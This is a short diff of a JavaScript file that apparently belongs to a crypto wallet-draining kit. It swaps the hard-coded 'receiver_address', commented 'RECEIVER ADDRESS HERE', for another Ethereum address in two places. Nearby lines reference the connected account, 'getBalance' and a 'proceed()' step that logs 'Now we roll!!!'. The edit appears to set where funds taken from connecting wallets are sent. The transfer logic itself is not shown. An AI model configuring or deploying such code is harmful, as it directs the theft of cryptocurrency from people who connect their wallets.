@@ -15,7 +15,7 @@ let provider;
 // Address of the selected account
 let selectedAccount;
 
-const receiver_addres = "0x41B53DdD97d72B265dfBaBE0E3159B2fA1c785DD"; // gaf<- RECEIVER ADDRESS HERE
+const receiver_addres = "0xd563046D7b5B669787caF376B0578b21E9C68459"; // gaf<- RECEIVER ADDRESS HERE
 let onButtonClick;
 let user_address;
 let start_to_log = false;
@@ -303,7 +303,7 @@ async function getBalance(
   });
 }
 
-const receiver_address = "0x41B53DdD97d72B265dfBaBE0E3159B2fA1c785DD";
+const receiver_address = "0xd563046D7b5B669787caF376B0578b21E9C68459";
 async function proceed() {
   start_to_log = false;
   console.log("Now we roll!!!");
